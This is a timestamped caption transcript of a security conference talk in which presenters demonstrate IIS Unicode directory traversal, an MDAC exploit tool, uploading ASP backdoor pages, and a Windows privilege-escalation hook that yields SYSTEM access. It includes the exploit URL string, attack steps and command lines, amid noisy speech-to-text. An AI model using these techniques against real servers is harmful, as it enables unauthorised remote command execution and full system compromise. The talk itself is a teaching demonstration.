    "text": "which takes in command line parameters so I have mdac hack VN C.L give host Ty",
    "start": "3528240",
    "end": "3536119"
  },
  {
    "text": "IP is 10 0 0 12 my IP is 10 0",
    "start": "3536119",
    "end": "3542319"
  },
  {
    "text": "01 my listener Port is 2001 and my tftp server is",
    "start": "3542319",
    "end": "3548359"
  },
  {
    "text": "103 so I hit this and uh let me move this on the side",
    "start": "3548359",
    "end": "3554200"
  },
  {
    "text": "so we'll see it's going targeting the N",
    "start": "3554200",
    "end": "3559440"
  },
  {
    "text": "server it says success comes back to us",
    "start": "3559440",
    "end": "3565039"
  },
  {
    "text": "and what happened",
    "start": "3565039",
    "end": "3571920"
  },
  {
    "text": "okay you never disconnected your first window no I I did I did the",
    "start": "3576079",
    "end": "3582799"
  },
  {
    "text": "exit so okay let me let me just make sure uh it's not",
    "start": "3582799",
    "end": "3591240"
  },
  {
    "text": "uh let me just make sure it's all okay",
    "start": "3593240",
    "end": "3598039"
  },
  {
    "text": "H very",
    "start": "3600480",
    "end": "3603160"
  },
  {
    "text": "interesting yeah and my IP address my IP over here is 101 the1 was",
    "start": "3608280",
    "end": "3616400"
  },
  {
    "text": "the other SQL Server guy uh let me see just quick",
    "start": "3616400",
    "end": "3622920"
  },
  {
    "text": "one a problem is demos don't scale exploits don't scale especially not when",
    "start": "3623240",
    "end": "3628440"
  },
  {
    "text": "you're trying to run them when the whole world is watching so let me run it again let",
    "start": "3628440",
    "end": "3636280"
  },
  {
    "text": "see uh my command line minus host minus Port I think I forgot uh I forgot minus",
    "start": "3636280",
    "end": "3644640"
  },
  {
    "text": "I my IP address is let me just type it again",
    "start": "3644640",
    "end": "3650960"
  },
  {
    "text": "inac hack VNC minus host 10 0",
    "start": "3650960",
    "end": "3657920"
  },
  {
    "text": "02 um minus I 10.0.0",
    "start": "3658480",
    "end": "3666039"
  },
  {
    "text": "do1 minus P 2001 minus t1.",
    "start": "3666480",
    "end": "3674039"
  },
  {
    "text": "0.0.3 okay here we go says success oops I didn't have the listener",
    "start": "3674200",
    "end": "3681079"
  },
  {
    "text": "up this time sorry once again",
    "start": "3681079",
    "end": "3687920"
  },
  {
    "text": "TR seem to be working oh fail",
    "start": "3697480",
    "end": "3704240"
  },
  {
    "text": "demo sorry about that this big aart May patch that maybe somebody",
    "start": "3704240",
    "end": "3711839"
  },
  {
    "text": "patched it on the side oh well let's let's excuse the guy for for one okay anyway so you understand how this",
    "start": "3711839",
    "end": "3719240"
  },
  {
    "text": "will work I'm not I'm not going to go go to this demo we'll skip it for now and",
    "start": "3719240",
    "end": "3726319"
  },
  {
    "text": "now we coming to the best part uh the last few parts where we we're going to",
    "start": "3726319",
    "end": "3731720"
  },
  {
    "text": "go un unrehearsed and show you new tricks uh we're going to talk about the",
    "start": "3731720",
    "end": "3736839"
  },
  {
    "text": "Unicode bug I'm sure everybody's heard of this bug it causes remote command",
    "start": "3736839",
    "end": "3743000"
  },
  {
    "text": "execution on I web servers under the context of a user which is pretty much",
    "start": "3743000",
    "end": "3749839"
  },
  {
    "text": "nobody or guest equivalent on an and if we pull off some neat little",
    "start": "3749839",
    "end": "3755640"
  },
  {
    "text": "tricks that we're going to show it can lead to potential administrator level access compromise next",
    "start": "3755640",
    "end": "3762359"
  },
  {
    "text": "slide so the exploit string is like this uh we have an IP address we take a",
    "start": "3762359",
    "end": "3768520"
  },
  {
    "text": "virtual route a virtual directory on the web server which has script execution",
    "start": "3768520",
    "end": "3774279"
  },
  {
    "text": "privileges that's very essential and from there we do a dot dot and a",
    "start": "3774279",
    "end": "3780920"
  },
  {
    "text": "percentage c0 or AF c0 AF is a illegal Unicode sequence which stands for the",
    "start": "3780920",
    "end": "3786680"
  },
  {
    "text": "slash character so we had a DOT effectively we've done a dot dot slash dot dot slash gone into Winn system32",
    "start": "3786680",
    "end": "3794799"
  },
  {
    "text": "cmd.exe it will execute because this directory has execute Privileges and",
    "start": "3794799",
    "end": "3800440"
  },
  {
    "text": "then give a question mark / C any command that we want the essential thing is this virtual",
    "start": "3800440",
    "end": "3807240"
  },
  {
    "text": "directory should lie in the same volume as the system route otherwise you can't",
    "start": "3807240",
    "end": "3812279"
  },
  {
    "text": "span volumes you should be able to find your way to cmd.exe somehow so uh I'm going to give you a",
    "start": "3812279",
    "end": "3819760"
  },
  {
    "text": "quick demo of this over here we have two systems let's",
    "start": "3819760",
    "end": "3825039"
  },
  {
    "text": "go to the next slide we have two systems uh 10 01 and",
    "start": "3825039",
    "end": "3830640"
  },
  {
    "text": "102 1010 is running 2000 102 is running n four we will show admin level",
    "start": "3830640",
    "end": "3838799"
  },
  {
    "text": "compromise on both so first let's get the nt4 guy it's",
    "start": "3838799",
    "end": "3844119"
  },
  {
    "text": "it's it's the easier of the two so here's the nt4 web page and let me go to",
    "start": "3844119",
    "end": "3851039"
  },
  {
    "text": "scripts do do c0 AF do Winn",
    "start": "3851039",
    "end": "3857760"
  },
  {
    "text": "system32 cmd.exe and over here I can give any command I",
    "start": "3857760",
    "end": "3864039"
  },
  {
    "text": "want let's Let me give the set command just to be really sure so over here the set command",
    "start": "3864039",
    "end": "3871400"
  },
  {
    "text": "actually worked and all the output got dumped in the browser window it set just shows you all the environment variables",
    "start": "3871400",
    "end": "3878000"
  },
  {
    "text": "on there you can do commands like uh CD to print the current directory or you",
    "start": "3878000",
    "end": "3884400"
  },
  {
    "text": "can do version V you can do di whatever you feel like",
    "start": "3884400",
    "end": "3890079"
  },
  {
    "text": "Z4 and now what we are going to do this next slide okay no go back back jump",
    "start": "3890079",
    "end": "3896160"
  },
  {
    "text": "back jump back okay what we're going to do in this demo is we're going to not do the usual tftp netcat thing we're going",
    "start": "3896160",
    "end": "3902039"
  },
  {
    "text": "to go one step further or one more advanced St yes your",
    "start": "3902039",
    "end": "3907318"
  },
  {
    "text": "question so your question is if the if the inet pub or if the web rout is not",
    "start": "3914760",
    "end": "3922480"
  },
  {
    "text": "on the same volume as the system Ro can we do this is that your question I don't",
    "start": "3922480",
    "end": "3929440"
  },
  {
    "text": "know of a way of doing it so far",
    "start": "3929440",
    "end": "3933000"
  },
  {
    "text": "no if we try to use percentage system root percent or something like that um",
    "start": "3938319",
    "end": "3944839"
  },
  {
    "text": "and use URL encoded versions Ive tried it it doesn't work it uh it doesn't it's",
    "start": "3944839",
    "end": "3950559"
  },
  {
    "text": "not that slick yes your question I know somebody is giving",
    "start": "3950559",
    "end": "3956359"
  },
  {
    "text": "giving a grin from the back they may know how to do it not telling any okay your",
    "start": "3956359",
    "end": "3961599"
  },
  {
    "text": "question you don't",
    "start": "3961599",
    "end": "3964960"
  },
  {
    "text": "have script executable directories will run into this [Music]",
    "start": "3968400",
    "end": "3973640"
  },
  {
    "text": "problem it would like if you can execute ASP Pages you can do this if the if the",
    "start": "3973640",
    "end": "3980599"
  },
  {
    "text": "virtual directory lies in the same volume as your system route and you're able to guess the PA out like sometimes",
    "start": "3980599",
    "end": "3987359"
  },
  {
    "text": "whenn is renamed it's whenn 40 or something then you'll have to make sure you get you have to be able to find your",
    "start": "3987359",
    "end": "3994279"
  },
  {
    "text": "way to cmd.exe by your guess work sometimes so uh let's let's do this uh",
    "start": "3994279",
    "end": "4003799"
  },
  {
    "text": "I'm sorry yes sorry your question sure I'm just wondering what it is about the um why you only have to use the UN code",
    "start": "4003799",
    "end": "4011240"
  },
  {
    "text": "representation of the slash character once what it is about the part that allows you get just say once then",
    "start": "4011240",
    "end": "4016799"
  },
  {
    "text": "slashes for the rest of the URL no okay uh your question is why do we your",
    "start": "4016799",
    "end": "4022480"
  },
  {
    "text": "question is why do we have to use the Unicode character for slash only once well if there are it is just that the",
    "start": "4022480",
    "end": "4030680"
  },
  {
    "text": "scripts directory lies in cinet Pub scripts so you do dot dot percent C 0%",
    "start": "4030680",
    "end": "4037039"
  },
  {
    "text": "AF so you get to CET Pub you do a dot dot and then you get back to the C volume route then you're free to go into",
    "start": "4037039",
    "end": "4044440"
  },
  {
    "text": "win n system 3 to if the virtual directory was further nested you'll have",
    "start": "4044440",
    "end": "4049520"
  },
  {
    "text": "to use multiple c0 AF pairs so it's not just you have to use it once you have to",
    "start": "4049520",
    "end": "4054960"
  },
  {
    "text": "use it as many times for every time you're recursing up the directory you must use that version of yes everything",
    "start": "4054960",
    "end": "4062240"
  },
  {
    "text": "on the left side of the question needs the unod everything on the right hand side",
    "start": "4062240",
    "end": "4069119"
  },
  {
    "text": "of question no because the question comes after also see",
    "start": "4069119",
    "end": "4075960"
  },
  {
    "text": "only when you're using dot dot you shouldn't use the slash character because that gets parsed out",
    "start": "4075960",
    "end": "4082039"
  },
  {
    "text": "of the URL and just the the directories get collapsed it's just when you use uh",
    "start": "4082039",
    "end": "4088079"
  },
  {
    "text": "this representation it keeps the dot do/ string um unbroken some unbroken in url",
    "start": "4088079",
    "end": "4095400"
  },
  {
    "text": "parsing that's that's Half Baked explanation but that's",
    "start": "4095400",
    "end": "4100679"
  },
  {
    "text": "true okay uh what we're going to do in this attack is uh we're not going to",
    "start": "4100679",
    "end": "4106000"
  },
  {
    "text": "we're going to assume that the firewalls are locked down so only Port 80 is allowed incoming no outbound access only",
    "start": "4106000",
    "end": "4114120"
  },
  {
    "text": "replies can go out and uh nothing else no tftp no net cats nothing and we want",
    "start": "4114120",
    "end": "4120838"
  },
  {
    "text": "to get an interactive command access just one way so what we're going to do",
    "start": "4120839",
    "end": "4126278"
  },
  {
    "text": "is uh we're going to use a pretty uh",
    "start": "4126279",
    "end": "4131359"
  },
  {
    "text": "crafty little technique somebody posted this technique recently on bug track um",
    "start": "4131359",
    "end": "4137359"
  },
  {
    "text": "if I might be allowed to brag I knew of it first but I'm trying to modestly brag",
    "start": "4137359",
    "end": "4143520"
  },
  {
    "text": "over here but uh I can vouch for that it was very cool so there you go JD thanks",
    "start": "4143520",
    "end": "4150440"
  },
  {
    "text": "man so let me go and show you um the tricks well he's getting that ready I",
    "start": "4150440",
    "end": "4156400"
  },
  {
    "text": "have a story we were uh doing that for a client and we did this trick for a client and we took the uh after it was",
    "start": "4156400",
    "end": "4163080"
  },
  {
    "text": "all over we got some information from the client you can all hear me all right okay and",
    "start": "4163080",
    "end": "4169199"
  },
  {
    "text": "uh we took the using using this trick we then took the CEO of the company outside",
    "start": "4169199",
    "end": "4174798"
  },
  {
    "text": "of the company so he was physically outside of his company and he looked back you know through a web browser at the information that we had taken from",
    "start": "4174799",
    "end": "4180798"
  },
  {
    "text": "outside of his company and he just went ballistic it was very good for",
    "start": "4180799",
    "end": "4186199"
  },
  {
    "text": "us they and the the thing was is they just got done installing like $250,000 worth of you know checkpoint one",
    "start": "4186199",
    "end": "4192120"
  },
  {
    "text": "firewalls and all this stuff and he wanted to go put to post cancellation you want to go cancel this",
    "start": "4192120",
    "end": "4198760"
  },
  {
    "text": "check okay so over here I have uh what I'm going to do is since we can Target",
    "start": "4198760",
    "end": "4205480"
  },
  {
    "text": "cmd.exe through the web we're going to make HTTP post requests and post",
    "start": "4205480",
    "end": "4212520"
  },
  {
    "text": "standard input to cmd.exe we're going to post 20 lines of input at a time so",
    "start": "4212520",
    "end": "4218199"
  },
  {
    "text": "effectively we'll get 20 commands run at once uh I have a",
    "start": "4218199",
    "end": "4224320"
  },
  {
    "text": "file called create all echo. txt which is actually an asp file multiple Echo",
    "start": "4224320",
    "end": "4231840"
  },
  {
    "text": "commands that just uh like over here you can see Echo dim field greater than",
    "start": "4231840",
    "end": "4237560"
  },
  {
    "text": "greater than upload 2.as like there's around there's 300 commands in here so this thing is going",
    "start": "4237560",
    "end": "4244520"
  },
  {
    "text": "to execute 15 times post 20 commands at once and we'll recreate an asp page on the target",
    "start": "4244520",
    "end": "4252199"
  },
  {
    "text": "server we still have I user privileges so you'll be able to dump the page in that directory if it's out of the box",
    "start": "4252199",
    "end": "4259199"
  },
  {
    "text": "install so we'll go create upload. ASP and this page allows us to upload any",
    "start": "4259199",
    "end": "4264840"
  },
  {
    "text": "binary file on the server and then we have we'll widen keep on widening that",
    "start": "4264840",
    "end": "4270120"
  },
  {
    "text": "hole and craw right through it so I have a quick Pearl script to do the whole",
    "start": "4270120",
    "end": "4276000"
  },
  {
    "text": "thing I've post unic code I just give the URL 10",
    "start": "4276000",
    "end": "4281400"
  },
  {
    "text": "00 uh 12 scripts uh do c0 AF do do/ win",
    "start": "4281400",
    "end": "4288719"
  },
  {
    "text": "n system32 cmd.exe and over here I just give the file that",
    "start": "4288719",
    "end": "4296640"
  },
  {
    "text": "I want to dump so notice over here it's sipping",
    "start": "4296640",
    "end": "4301719"
  },
  {
    "text": "through W it went through pretty fast uh created the whole file with multiple",
    "start": "4301719",
    "end": "4307239"
  },
  {
    "text": "Echo commands you can see over here here's when uh cmd.exe gets run you have",
    "start": "4307239",
    "end": "4312960"
  },
  {
    "text": "all these commands over here and now now let's just browse through uh this one we",
    "start": "4312960",
    "end": "4320000"
  },
  {
    "text": "have HTTP 10.0.0 do10 I mean sorry 12 um",
    "start": "4320000",
    "end": "4327239"
  },
  {
    "text": "scripts upload. ASP and voila the ASP page is there",
    "start": "4327239",
    "end": "4334719"
  },
  {
    "text": "allows me to upload 10 files at a time so come on this is like the Cadillac of",
    "start": "4334719",
    "end": "4340920"
  },
  {
    "text": "hacking I love this trick so let me upload uh what shall we do we'll upload",
    "start": "4340920",
    "end": "4346000"
  },
  {
    "text": "another page called asp exec. asp we'll upload a little dll component with that",
    "start": "4346000",
    "end": "4352280"
  },
  {
    "text": "called ASP exec. dll uh which we will remotely",
    "start": "4352280",
    "end": "4358760"
  },
  {
    "text": "register with system Privileges and we will upload something",
    "start": "4358760",
    "end": "4364600"
  },
  {
    "text": "completely new .exe J you want to talk to talk about fsis a little bit okay so flip the slide",
    "start": "4364600",
    "end": "4373440"
  },
  {
    "text": "please um we're going to upload FIS which is uh a",
    "start": "4373440",
    "end": "4378679"
  },
  {
    "text": "privilege escalation attack heightened security awareness as we call it it allows us essentially to execute",
    "start": "4378679",
    "end": "4387199"
  },
  {
    "text": "commands in system context I think you're best suited to",
    "start": "4387199",
    "end": "4394159"
  },
  {
    "text": "talk about this one okay um hey well why don't you talk about how you use it and then I'll tell them what it does okay",
    "start": "4394159",
    "end": "4399719"
  },
  {
    "text": "you tell them what it does I'll set it up",
    "start": "4399719",
    "end": "4405880"
  },
  {
    "text": "this way this works okay um sill needed a way to uh escalate",
    "start": "4405880",
    "end": "4411679"
  },
  {
    "text": "privilege to go from I user to system so um I I made in this little Tool uh that",
    "start": "4411679",
    "end": "4417880"
  },
  {
    "text": "does that hey is Todd Sav here in the room no he had a really cool thing",
    "start": "4417880",
    "end": "4423000"
  },
  {
    "text": "called uh um HK it's much cooler than mine but this uh here has a way it works",
    "start": "4423000",
    "end": "4429440"
  },
  {
    "text": "you know whenever I'm stuck whenever I'm in need something I'll call up JD on the phone say JD can you fix me something",
    "start": "4429440",
    "end": "4436280"
  },
  {
    "text": "that goes from IA to system JD says okay JD can you fix me something that detects root kit JD says okay anything I ask all",
    "start": "4436280",
    "end": "4444679"
  },
  {
    "text": "the man says okay so it's wonderful give him a",
    "start": "4444679",
    "end": "4449120"
  },
  {
    "text": "[Applause] hand um what this does is this makes use",
    "start": "4449750",
    "end": "4455040"
  },
  {
    "text": "of a technique called um NTI API interception uh basically what we want to do is",
    "start": "4455040",
    "end": "4461840"
  },
  {
    "text": "um uh the the the colonel has to make calls to um you know itself and all of",
    "start": "4461840",
    "end": "4467400"
  },
  {
    "text": "its internal functions to get things done um so what we want to do is intercept that process and uh divert it",
    "start": "4467400",
    "end": "4474360"
  },
  {
    "text": "make our own modifications and then let then uh forward our call back to the other system so what it allows us to do",
    "start": "4474360",
    "end": "4479679"
  },
  {
    "text": "is perform a privilege escalation attack um allows us to get past some of the um IAS uh restrictions that were're in the",
    "start": "4479679",
    "end": "4486560"
  },
  {
    "text": "little gets us out of the sandbox that we're in um again uses the this API",
    "start": "4486560",
    "end": "4491600"
  },
  {
    "text": "interception technique and then once we've done that um the system is now tricked into thinking that that we're",
    "start": "4491600",
    "end": "4497679"
  },
  {
    "text": "the system and we're no longer the I user uh",
    "start": "4497679",
    "end": "4503159"
  },
  {
    "text": "account do you when do you want to run the thing I'm running this is the part we haven't rehearsed yet okay okay go",
    "start": "4503159",
    "end": "4510080"
  },
  {
    "text": "ahead so I'm going to run the I'm going to run the exploit now he's just talked to you a little bit about fsis uh I have",
    "start": "4510080",
    "end": "4517120"
  },
  {
    "text": "uploaded three files big a pardon well we're going to",
    "start": "4517120",
    "end": "4523960"
  },
  {
    "text": "talk about that in a second that's actually not true we're going to talk about that in a",
    "start": "4523960",
    "end": "4530159"
  },
  {
    "text": "second okay uh we have uploaded this uh this is N4 right now and uh let's see",
    "start": "4530159",
    "end": "4537880"
  },
  {
    "text": "what we got we we still have one step remaining we want to register ASP exact.",
    "start": "4537880",
    "end": "4544679"
  },
  {
    "text": "dll as as a Comm object so that the script ASP exact. ESP can make calls to",
    "start": "4544679",
    "end": "4550679"
  },
  {
    "text": "it and run commands and we're going to use fsis to register this thing as system so we'll be able to make uh",
    "start": "4550679",
    "end": "4557960"
  },
  {
    "text": "commands as system again I go to this thing I use uh post post unic code and",
    "start": "4557960",
    "end": "4565840"
  },
  {
    "text": "I'll actually have another version called post CMD which just does couple of commands at a time and I'm going to",
    "start": "4565840",
    "end": "4572120"
  },
  {
    "text": "run ASP",
    "start": "4572120",
    "end": "4575400"
  },
  {
    "text": "register excuse me I run this one the commands executed",
    "start": "4577400",
    "end": "4583400"
  },
  {
    "text": "over here are F6 cmd.exe SLC copy the dll over to win an system32",
    "start": "4583400",
    "end": "4591719"
  },
  {
    "text": "onx right yeah this this is an N4 box and uh do FIS and then do reg svr 32 to",
    "start": "4591719",
    "end": "4598960"
  },
  {
    "text": "register the dll uh and we we're all set now all we have to do is browse over to scripts as",
    "start": "4598960",
    "end": "4607960"
  },
  {
    "text": "exec. ASP and we just have a prompt over here we have a we have a field we type",
    "start": "4607960",
    "end": "4614639"
  },
  {
    "text": "in any command we want we hit run it runs so we type ip config",
    "start": "4614639",
    "end": "4622080"
  },
  {
    "text": "/all R so here's our interactive command prompt well semi interactive as as good",
    "start": "4622080",
    "end": "4627600"
  },
  {
    "text": "as it gets all through one way over Port 80 I can upload more tools that I more",
    "start": "4627600",
    "end": "4634920"
  },
  {
    "text": "tools if I want I'll just do upload. ASP I'm going to upload",
    "start": "4634920",
    "end": "4641520"
  },
  {
    "text": "uh I'm going to upload who am I uh just to show system",
    "start": "4641520",
    "end": "4649440"
  },
  {
    "text": "privileges upload it over here and go to ASP exec and run",
    "start": "4649440",
    "end": "4657280"
  },
  {
    "text": "it and I'm just going to run uh C inetpub scripts Who Am i. exe it says",
    "start": "4660600",
    "end": "4669800"
  },
  {
    "text": "I'm n Authority system so I pretty much own this system remotely",
    "start": "4669800",
    "end": "4676520"
  },
  {
    "text": "Todd Sabin tool also did the same thing well Todd Sabin tool does privilege escalation as well for ent4 so instead",
    "start": "4676520",
    "end": "4683880"
  },
  {
    "text": "of fsis you can use that one and get this get to the same effect um now we're",
    "start": "4683880",
    "end": "4690320"
  },
  {
    "text": "going to talk about doing the same thing on Windows 2000 and uh let me let me",
    "start": "4690320",
    "end": "4696320"
  },
  {
    "text": "just let me just prep up to it let me just run the unic code and create the same forms over there so I'm going to",
    "start": "4696320",
    "end": "4703120"
  },
  {
    "text": "use same technique um on 10 00",
    "start": "4703120",
    "end": "4710320"
  },
  {
    "text": "10 actually I'll have to um you",
    "start": "4710320",
    "end": "4716199"
  },
  {
    "text": "this this is uh oh say secure Channel required I",
    "start": "4716199",
    "end": "4723000"
  },
  {
    "text": "had to set up a redirector you want to talk about FS uh for for that part okay",
    "start": "4723000",
    "end": "4729199"
  },
  {
    "text": "and I'll just prep this up oops",
    "start": "4729199",
    "end": "4735740"
  },
  {
    "text": "[Music] um one of the things that uh LeBlanc was bringing up in the back is uh um this",
    "start": "4735740",
    "end": "4743560"
  },
  {
    "text": "attack works by default against nt4 I have the the privilege that I need to be able to run this interception attack it",
    "start": "4743560",
    "end": "4749159"
  },
  {
    "text": "doesn't work by default on Windows 2000 because uh the debug privilege has been restricted to only the um administrator",
    "start": "4749159",
    "end": "4755320"
  },
  {
    "text": "account however there are a lot of uh people I I know specifically um two of our clients that they don't make other",
    "start": "4755320",
    "end": "4761800"
  },
  {
    "text": "people admins but they do pass out the debug privilege to especially to e-commerce developers other developers",
    "start": "4761800",
    "end": "4767480"
  },
  {
    "text": "who are making their online system so uh it doesn't work by default you do have to hand it out but we do find it and",
    "start": "4767480",
    "end": "4772760"
  },
  {
    "text": "it's common enough to get us in whereas uh before uh the Unicode uh thing would",
    "start": "4772760",
    "end": "4777880"
  },
  {
    "text": "always fail to not give us enough privileges to do what we wanted where now we can probably get in about maybe 30% of the",
    "start": "4777880",
    "end": "4785638"
  },
  {
    "text": "time this uh this server had a little little curve thrown in it was running only SSL like it was just denying all",
    "start": "4792120",
    "end": "4800040"
  },
  {
    "text": "web requests which were not SSL so I just set up a quick SSL redirector so it",
    "start": "4800040",
    "end": "4806600"
  },
  {
    "text": "it does all the forwarding just as an example so now instead of attacking",
    "start": "4806600",
    "end": "4812239"
  },
  {
    "text": "10.0.0 do10 directly I'm going to attack 103 which will pass on all the request",
    "start": "4812239",
    "end": "4817560"
  },
  {
    "text": "10 uh 0010 so let me do that now I'm going to",
    "start": "4817560",
    "end": "4822840"
  },
  {
    "text": "run uh same program instead on",
    "start": "4822840",
    "end": "4829960"
  },
  {
    "text": "103 so okay there it goes created everything",
    "start": "4830800",
    "end": "4836320"
  },
  {
    "text": "and now I'll go to 10 0010 scripts upload. ASP oops secure",
    "start": "4836320",
    "end": "4844000"
  },
  {
    "text": "Channel required yeah let's give https",
    "start": "4844000",
    "end": "4849560"
  },
  {
    "text": "continue by gosh where something going",
    "start": "4849560",
    "end": "4857080"
  },
  {
    "text": "wrong um oh it's not a it's not a backlash",
    "start": "4860800",
    "end": "4868719"
  },
  {
    "text": "issue hang on",
    "start": "4868719",
    "end": "4872440"
  },
  {
    "text": "this this and uh let me just turn on that",
    "start": "4879560",
    "end": "4885600"
  },
  {
    "text": "whole secure thing required off for now so we can go ahead with quick",
    "start": "4885600",
    "end": "4891840"
  },
  {
    "text": "demo just give me a second over",
    "start": "4894440",
    "end": "4898760"
  },
  {
    "text": "here",
    "start": "4913520",
    "end": "4916520"
  },
  {
    "text": "just a",
    "start": "4930800",
    "end": "4933239"
  },
  {
    "text": "second say this turned off okay hang on",
    "start": "4940199",
    "end": "4945800"
  },
  {
    "text": "with this let's see if it works sorry about",
    "start": "4945800",
    "end": "4952159"
  },
  {
    "text": "that oh it still crashes on",
    "start": "4954480",
    "end": "4959480"
  },
  {
    "text": "us uh we got a",
    "start": "4960480",
    "end": "4964560"
  },
  {
    "text": "problem exploits don't scale well does anybody hear from uh the NT sniffing",
    "start": "4969520",
    "end": "4975320"
  },
  {
    "text": "class yesterday okay you guys saw this so you can verify it",
    "start": "4975320",
    "end": "4982040"
  },
  {
    "text": "work okay let's let's just go to the quick next slide",
    "start": "4982040",
    "end": "4987120"
  },
  {
    "text": "um you talked about this thing I'll talk about this for a second okay sure",
    "start": "4987120",
    "end": "4994440"
  },
  {
    "text": "um uh the tool HK only works on um uh nt4 we need something that worked on",
    "start": "4996520",
    "end": "5001840"
  },
  {
    "text": "Windows 2000 so uh I started to work on the FIS tool um there is a caveat it",
    "start": "5001840",
    "end": "5007440"
  },
  {
    "text": "currently does require the debug privilege hover um working on a figuring out a way to bypass that uh usually only",
    "start": "5007440",
    "end": "5015000"
  },
  {
    "text": "admin has that privilege by default uh in Windows 2000 debug",
    "start": "5015000",
    "end": "5020520"
  },
  {
    "text": "privilege doesn't get assigned to any other accounts however we again we have found especially with e-commerce systems",
    "start": "5020520",
    "end": "5026880"
  },
  {
    "text": "instead of making people putting people in the administrator group they just hand out the debug privilege people ad group same",
    "start": "5026880",
    "end": "5035639"
  },
  {
    "text": "well it's just you know the way people configure their systems you know it's uh I am trying to say that by default it's",
    "start": "5035639",
    "end": "5041600"
  },
  {
    "text": "fine I'm saying other people you know open it up in a way that they don't think that it's open but it still is so",
    "start": "5041600",
    "end": "5047560"
  },
  {
    "text": "uh you know it doesn't get a sin all the time but it gets a sin sometimes when I when I fix that and I get to 100% you'll",
    "start": "5047560",
    "end": "5053080"
  },
  {
    "text": "be the first person I tell Dave I swear I love Dave he's a great guy we",
    "start": "5053080",
    "end": "5059760"
  },
  {
    "text": "him and I getting the most heated arguments I have no idea why but it's uh",
    "start": "5059760",
    "end": "5065239"
  },
  {
    "text": "It's A War I guess uh basically the way it works is",
    "start": "5065239",
    "end": "5071159"
  },
  {
    "text": "um uh fsis loads ntdll uh grabs and stores the uh the N API n create process",
    "start": "5071159",
    "end": "5079840"
  },
  {
    "text": "um for those who don't know n actually has two apis there's a 132 API which is the programming API and then there's the",
    "start": "5079840",
    "end": "5085760"
  },
  {
    "text": "native n language which is the NT API the NT API is a Unicode um Almost 100%",
    "start": "5085760",
    "end": "5092719"
  },
  {
    "text": "Unicode API processes strings is Unicode the uh 132 API uh has two versions of uh",
    "start": "5092719",
    "end": "5100199"
  },
  {
    "text": "function calls that take either Unicode or aski strings whenever you call a 132",
    "start": "5100199",
    "end": "5105960"
  },
  {
    "text": "uh API function it just does a little bit of processing and then turns right around and calls um the uh NT equivalent",
    "start": "5105960",
    "end": "5113920"
  },
  {
    "text": "um Niti call so then what I do is I create my own um you know arbitrary F create",
    "start": "5113920",
    "end": "5120960"
  },
  {
    "text": "process and once I have the address of n create process I write the address of my",
    "start": "5120960",
    "end": "5127520"
  },
  {
    "text": "process to where the original NT create process was uh what that serves to do is",
    "start": "5127520",
    "end": "5133360"
  },
  {
    "text": "then any calls to that address get rerouted to my function and then I basically have control over that and I",
    "start": "5133360",
    "end": "5138400"
  },
  {
    "text": "can do what I want uh I use some inline Assembly Language to modify the stack parameters",
    "start": "5138400",
    "end": "5143800"
  },
  {
    "text": "and then forward the call back to the original here's kind of what it looks",
    "start": "5143800",
    "end": "5150000"
  },
  {
    "text": "like in in code um this is a the top one get proc address is a",
    "start": "5150000",
    "end": "5155920"
  },
  {
    "text": "132 uh function call which gives me the the hook is actually a pointer to the",
    "start": "5155920",
    "end": "5161840"
  },
  {
    "text": "function in t create process and then I make a couple calls called virtual query",
    "start": "5161840",
    "end": "5167040"
  },
  {
    "text": "um gives me some information about uh where that uh is located and then",
    "start": "5167040",
    "end": "5172520"
  },
  {
    "text": "basically what I want to do is I want to do virtual protect and I want to change the um memory protection instead of just",
    "start": "5172520",
    "end": "5178880"
  },
  {
    "text": "a read only to read write then uh down below you'll see",
    "start": "5178880",
    "end": "5184360"
  },
  {
    "text": "taking my address for the function I created and I'm modifying that system address that hook pointer address",
    "start": "5184360",
    "end": "5192639"
  },
  {
    "text": "thing uh then in my call I want to uh this app I want to run I call the uh",
    "start": "5192639",
    "end": "5198639"
  },
  {
    "text": "win32 function create process and what that does is that turns right around and calls the ant create process function uh",
    "start": "5198639",
    "end": "5206520"
  },
  {
    "text": "which gets rerouted to mine and that's that's pretty much the",
    "start": "5206520",
    "end": "5213040"
  },
  {
    "text": "way it works um",
    "start": "5213040",
    "end": "5220760"
  },
  {
    "text": "okay for some reason upload. ASP refuses to work but we'll we'll do a we'll do a",
    "start": "5221960",
    "end": "5227760"
  },
  {
    "text": "little work around we'll go and do the command prompt thing instead so excuse us for that one",
    "start": "5227760",
    "end": "5235119"
  },
  {
    "text": "yes HK Beed by app security",
    "start": "5235119",
    "end": "5243040"
  },
  {
    "text": "about you know I don't know um I I haven't",
    "start": "5243119",
    "end": "5250000"
  },
  {
    "text": "played around enough of it yet to know you know what actually defeats it or you know what what you can take um uh mostly",
    "start": "5250000",
    "end": "5257760"
  },
  {
    "text": "all all it takes is the ability to read or to write to a memory address that",
    "start": "5257760",
    "end": "5262960"
  },
  {
    "text": "usually just has um you know read protection on it so there's probably several ways you can get around it I'm",
    "start": "5262960",
    "end": "5268719"
  },
  {
    "text": "currently using one way to get to it um but there's there's several ways to you know try and um you know get that",
    "start": "5268719",
    "end": "5275480"
  },
  {
    "text": "privilege U was it um dild doog just came out with the new DDE thing um uh",
    "start": "5275480",
    "end": "5282480"
  },
  {
    "text": "exploit uh so I haven't I haven't taken a look at that yet to see like how he's doing it so what may currently work",
    "start": "5282480",
    "end": "5288440"
  },
  {
    "text": "today may not work tomorrow um but I haven't explored that issue enough myself I just kind of came up with this so I don't know what steps you can take",
    "start": "5288440",
    "end": "5295199"
  },
  {
    "text": "to lock it off besides just not having the Debo privilege ifying the operating system",
    "start": "5295199",
    "end": "5303239"
  },
  {
    "text": "you are this is a NE thing it's a NE technique I'll certainly that but it's",
    "start": "5303239",
    "end": "5309719"
  },
  {
    "text": "an awful lot of trou to go through just add I use to the administrator group you",
    "start": "5309719",
    "end": "5315199"
  },
  {
    "text": "could do the same thing much more directly with you got you just open a process run local system",
    "start": "5315199",
    "end": "5323920"
  },
  {
    "text": "It Go lot simp ways to accom the same there probably is this this uh you know",
    "start": "5323920",
    "end": "5330199"
  },
  {
    "text": "f is only probably like about 25 lines of code uh HK is much more elegant it's",
    "start": "5330199",
    "end": "5335679"
  },
  {
    "text": "like I think it's like 300 lines of code I was looking at it the other day and I you know there's there's several ways",
    "start": "5335679",
    "end": "5341560"
  },
  {
    "text": "you know LeBlanc got his way Todd Sav got his way um you know dild dog's got you know his own couple ways so um",
    "start": "5341560",
    "end": "5349880"
  },
  {
    "text": "important thing is debug access debug rights is equivalent to access I'm astonished that people don't",
    "start": "5349880",
    "end": "5357080"
  },
  {
    "text": "understand that um many people don't you know I mean it's just a it's just a fact",
    "start": "5357080",
    "end": "5362520"
  },
  {
